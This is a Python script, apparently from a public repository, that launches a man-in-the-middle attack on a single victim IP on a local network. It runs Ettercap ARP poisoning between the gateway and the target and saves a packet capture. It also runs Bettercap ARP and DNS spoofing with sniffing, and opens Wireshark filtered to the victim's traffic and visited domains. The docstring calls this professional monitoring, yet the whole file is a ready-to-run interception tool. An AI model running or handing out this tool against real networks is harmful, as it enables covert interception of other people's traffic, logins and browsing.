#!/usr/bin/env python3
"""
Aggressive Sniffer + MITM Launcher
Author: cyb2rS2c
Description:
    This script helps network monitoring professionals quickly spin up
    Ettercap, Bettercap, and Wireshark for man-in-the-middle (MITM)
    and packet sniffing against a single target on a given interface.

    - Ettercap is used for ARP-based MITM and packet logging.
    - Bettercap is used for more advanced MITM features (ARP + DNS spoofing).
    - Wireshark is launched with a live filter targeting the victim IP
      and optionally domain names loaded from url_file.txt.

    If url_file.txt does not exist or is empty, the script will run
    common_url.py to generate it automatically.
"""

import asyncio
import os
import re
import subprocess
import sys
import random
import ipaddress
import psutil
import shutil
from colorama import Fore, init
import pyfiglet
from termcolor import colored
import time
# Initialize Colorama
init(autoreset=True)

# ---------------- Banner ---------------- #

def create_ascii_text():
    """Display animated ASCII art banner with random font/color."""
    font_list = pyfiglet.FigletFont.getFonts()
    color_list = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    default_text = "Keep Threats Outside"

    # Clear the screen
    os.system("clear" if os.name == "posix" else "cls")

    # Choose random font and color
    font_choice = random.choice(font_list)
    color_choice = random.choice(color_list)
    ascii_art = pyfiglet.figlet_format(default_text, font=font_choice)

    # Animate line by line
    for line in ascii_art.splitlines():
        print(colored(line, color_choice))
        time.sleep(0.05)  # small delay between lines for animation effect

    # Animated author line
    author_text = "author: cyb2rS2c"
    for char in author_text:
        print(colored(char, 'red'), end='', flush=True)
        time.sleep(0.05)
    print("\n")

# ---------------- Validation ---------------- #

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except Exception:
        return False

def is_valid_iface(iface):
    return iface in psutil.net_if_addrs().keys()

def check_dependencies():
    """Ensure required tools exist in PATH."""
    required = ["ettercap", "etterfilter", "bettercap", "wireshark"]
    missing = [tool for tool in required if not shutil.which(tool)]
    if missing:
        print(Fore.RED + f"[!] Missing dependencies: {', '.join(missing)}")
        sys.exit(1)

# ---------------- URL File ---------------- #

def ensure_url_file():
    """Check if url_file.txt exists and has content, else run common_url.py."""
    url_file = "url_file.txt"
    needs_creation = False

    if not os.path.isfile(url_file):
        needs_creation = True
    else:
        try:
            with open(url_file, "r") as f:
                contents = f.read().strip()
                if not contents:
                    needs_creation = True
        except Exception:
            needs_creation = True

    if needs_creation:
        print(Fore.YELLOW + "[*] No valid url_file.txt found. Running common_url.py...")
        try:
            result = subprocess.run(
                [sys.executable, "common_url.py"],
                check=True,
                capture_output=True,
                text=True
            )
            print(Fore.GREEN + "[+] common_url.py executed successfully.")
            if result.stdout.strip():
                print(Fore.CYAN + f"[*] common_url.py output:\n{result.stdout}")
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"[!] Failed to execute common_url.py: {e.stderr}")
            sys.exit(1)

    return url_file

# ---------------- Network Info ---------------- #

async def get_network_info(interface):
    """Return (default_gateway, local_ip) for interface."""
    try:
        proc = await asyncio.create_subprocess_exec("ip", "route", stdout=asyncio.subprocess.PIPE)
        stdout, _ = await proc.communicate()
        route_output = stdout.decode()
        gateway_match = re.search(r"default via (\S+)", route_output)
        default_gateway = gateway_match.group(1) if gateway_match else None

        proc = await asyncio.create_subprocess_exec("ip", "addr", "show", interface, stdout=asyncio.subprocess.PIPE)
        stdout, _ = await proc.communicate()
        ip_output = stdout.decode()
        ip_match = re.search(r"inet (\S+)", ip_output)
        ip_address = ip_match.group(1).split("/")[0] if ip_match else None

        return default_gateway, ip_address
    except Exception as e:
        print(Fore.RED + f"[!] Network info error: {e}")
        return None, None

# ---------------- Excluded IPs ---------------- #

def create_excluded_ips_for_target(target_ip):
    """Generate list of subnet IPs to exclude, except target itself."""
    try:
        subnet = ipaddress.ip_network(f"{target_ip}/24", strict=False)
    except Exception:
        return []
    return [str(ip) for ip in subnet.hosts() if str(ip) != target_ip]

def create_excluded_ips_file(filter_file, exclude_ips):
    """Write Ettercap filter file for excluded IPs."""
    try:
        with open(filter_file, "w") as f:
            for ip in exclude_ips:
                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
                f.write("    drop();\n")
                f.write("}\n")
        print(Fore.GREEN + f"[+] Created filter file: {filter_file}")
    except Exception as e:
        print(Fore.RED + f"[!] Error creating filter file: {e}")

# ---------------- Ettercap ---------------- #

async def compile_filter_file(filter_file):
    if not os.path.isfile(filter_file):
        print(Fore.RED + f"[!] Error: '{filter_file}' does not exist.")
        return None
    compiled_file = filter_file.replace(".ef", ".efc")
    compile_cmd = ["etterfilter", filter_file, "-o", compiled_file]
    proc = await asyncio.create_subprocess_exec(*compile_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await proc.communicate()
    return compiled_file

async def run_ettercap(interface, default_gateway, target_ip, filter_file):
    compiled_file = await compile_filter_file(filter_file)
    if not compiled_file:
        print(Fore.RED + "[!] Failed to compile filter file.")
        return

    pcap_file = f"{target_ip}_filtered_activity.pcap"
    ettercap_cmd = [
        "ettercap", "-T", "-S", "-i", interface, "-F", compiled_file,
        "-M", "arp:remote", f"//{default_gateway}/", f"//{target_ip}/",
        "-w", pcap_file
    ]

    print(Fore.YELLOW + f"[*] Starting Ettercap on {interface} → {target_ip}")
    proc = await asyncio.create_subprocess_exec(*ettercap_cmd)
    await proc.communicate()

# ---------------- Bettercap ---------------- #

async def run_bettercap(interface, target_ip):
    domaintoforward = "unused.com"
    commands = [
        "net.probe on",
        "net.show",
        f"set arp.spoof.targets {target_ip}",
        "net.sniff on",
        "clear",
        f"set dns.spoof.domains {domaintoforward}",
        "dns.spoof on"
    ]
    bettercap_cmds = "; ".join(commands)

    bettercap_cmd = ["bettercap", "-I", interface, "-eval", bettercap_cmds]
    print(Fore.YELLOW + f"[*] Starting Bettercap on {interface} → {target_ip}")
    proc = await asyncio.create_subprocess_exec(*bettercap_cmd)
    await proc.communicate()

# ---------------- Wireshark ---------------- #

def load_url_filters(url_file):
    try:
        with open(url_file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def build_wireshark_filter(target_ip, exclude_ips, url_file=None):
    target_ip_filter = f"(ip.src == {target_ip} || ip.dst == {target_ip})"
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])

    filters = [target_ip_filter]
    if exclude_filter:
        filters.append(f"({exclude_filter})")

    if url_file and os.path.isfile(url_file):
        urls = load_url_filters(url_file)
        if urls:
            domain_filters = []
            for url in urls:
                # Extract only the domain
                domain = re.sub(r"^https?://", "", url)  # remove http:// or https://
                domain = domain.split("/")[0]            # remove any path after domain
                domain_filters.append(f'http.host contains "{domain}"')
                domain_filters.append(f'tls.handshake.extensions_server_name contains "{domain}"')
            filters.append("(" + " || ".join(domain_filters) + ")")

    return " && ".join(filters)


async def launch_wireshark(interface, target_ip, exclude_ips, url_file="url_file.txt"):
    filter_str = build_wireshark_filter(target_ip, exclude_ips, url_file)
    print(Fore.BLUE + f"[*] Launching Wireshark on {interface} with filter:\n{filter_str}")
    subprocess.Popen(["wireshark", "-i", interface, "-k", "-Y", filter_str])

# ---------------- Main ---------------- #

def print_usage():
    print(Fore.CYAN + "Usage:")
    print(Fore.YELLOW + "  sudo python3 listenOnSomeOne.py <target_ip> <interface>\n")
    print(Fore.CYAN + "Example:")
    print(Fore.YELLOW + "  sudo python3 listenOnSomeOne.py 192.168.1.100 eth0\n")

async def main(target_ip, interface, default_gateway, exclude_ips):
    filter_file = "excluded_ips.ef"
    create_excluded_ips_file(filter_file, exclude_ips)

    print(Fore.MAGENTA + "[*] Starting monitoring toolkit...")
    await asyncio.gather(
        run_ettercap(interface, default_gateway, target_ip, filter_file),
        run_bettercap(interface, target_ip),
        launch_wireshark(interface, target_ip, exclude_ips, "url_file.txt")
    )

if __name__ == "__main__":
    try:
        create_ascii_text()
        if len(sys.argv) != 3:
            print_usage()
            sys.exit(1)

        target_ip = sys.argv[1]
        interface = sys.argv[2]

        if not is_valid_ipv4(target_ip):
            print(Fore.RED + "[!] Invalid target IP.")
            sys.exit(1)
        if not is_valid_iface(interface):
            print(Fore.RED + "[!] Invalid network interface.")
            sys.exit(1)

        check_dependencies()

        # 🔑 Ensure url_file.txt exists or generate it
        url_file = ensure_url_file()

        default_gateway, ip_address = asyncio.run(get_network_info(interface))
        if not default_gateway or not ip_address:
            print(Fore.RED + "[!] Could not detect default gateway or local IP.")
            sys.exit(1)

        exclude_ips = create_excluded_ips_for_target(target_ip)
        asyncio.run(main(target_ip, interface, default_gateway, exclude_ips))

    except KeyboardInterrupt:
        print("\n[!] User interrupted. Exiting cleanly.")
    except RuntimeError as e:
        print(f"[!] Error: {e}")
